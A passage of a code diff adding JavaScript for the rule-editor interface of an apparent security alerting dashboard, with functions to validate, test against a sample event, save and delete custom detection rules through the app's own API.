+  $("#re-save").hidden = isView;
+  $("#re-validate").hidden = isView;
+  $("#re-delete").hidden = mode !== "edit";
+  $("#re-id").disabled = mode !== "new";
+
+  updateYaml();
+  lockForm(isView);
+  $("#re-id").disabled = isView || mode !== "new";
+  $("#rule-scrim").classList.add("open");
+}
+
+function closeEditor() { $("#rule-scrim").classList.remove("open"); state.editing = null; }
+
+async function validateRule(showOk) {
+  const out = $("#re-status");
+  try {
+    const res = await api("/api/rules/validate", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ definition: buildDefinition() }) });
+    if (res.valid) { out.className = "re-status ok"; if (showOk) out.textContent = "Valid rule."; return true; }
+    out.className = "re-status err"; out.textContent = res.error || "Invalid"; return false;
+  } catch (e) { out.className = "re-status err"; out.textContent = e.message; return false; }
+}
+
+async function testRule() {
+  const out = $("#re-test-out");
+  let sample;
+  try { sample = JSON.parse($("#re-sample").value); }
+  catch (e) { out.className = "re-test-out err"; out.textContent = "Sample is not valid JSON"; return; }
+  try {
+    const res = await api("/api/rules/validate", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ definition: buildDefinition(), sample_event: sample }) });
+    if (!res.valid) { out.className = "re-test-out err"; out.textContent = res.error; return; }
+    if (res.matched) { out.className = "re-test-out ok"; out.textContent = "✓ matches — this event would alert"; }
+    else { out.className = "re-test-out no"; out.textContent = "✗ no match on this event"; }
+  } catch (e) { out.className = "re-test-out err"; out.textContent = e.message; }
+}
+
+async function saveRule() {
+  if (!(await validateRule(false))) return;
+  const defn = buildDefinition();
+  const editing = state.editing;
+  try {
+    if (editing.mode === "edit") {
+      await api(`/api/rules/custom/${editing.id}`, {
+        method: "PUT", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ definition: defn, enabled: true }) });
+    } else {
+      await api("/api/rules/custom", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ definition: defn, enabled: true }) });
+    }
+    closeEditor(); loadRules(); refresh();
+  } catch (e) { const o = $("#re-status"); o.className = "re-status err"; o.textContent = e.message; }
+}
+
+/* ---- wiring ---- */
+$("#tab-alerts").onclick = () => switchView("alerts");
+$("#tab-rules").onclick = () => switchView("rules");
+$("#rf-source").onchange = renderRules;
+$("#rf-severity").onchange = renderRules;
+$("#btn-new-rule").onclick = () => openEditor(null, "new");
+$("#re-add-cond").onclick = () => { $("#re-conditions").appendChild(conditionRow()); updateYaml(); };
+$("#rule-close").onclick = closeEditor;
+$("#re-cancel").onclick = closeEditor;
+$("#rule-scrim").addEventListener("click", (e) => { if (e.target === $("#rule-scrim")) closeEditor(); });
+$("#re-validate").onclick = () => validateRule(true);
+$("#re-test").onclick = testRule;
+$("#re-example").onclick = () => { $("#re-sample").value = JSON.stringify(SAMPLES[$("#re-category").value] || SAMPLES[""], null, 2); };
+$("#re-save").onclick = saveRule;
+$("#re-delete").onclick = () => { if (state.editing) deleteRule({ id: state.editing.id }); };
+["re-title","re-severity","re-category","re-desc","re-mitre","re-refs","re-id"].forEach((id) =>
+  document.getElementById(id).addEventListener("input", updateYaml));
+document.querySelectorAll(".re-plat").forEach((c) => c.addEventListener("change", updateYaml));
+document.addEventListener("keydown", (e) => { if (e.key === "Escape") closeEditor(); });
+
+</script>
+</body>
+</html>
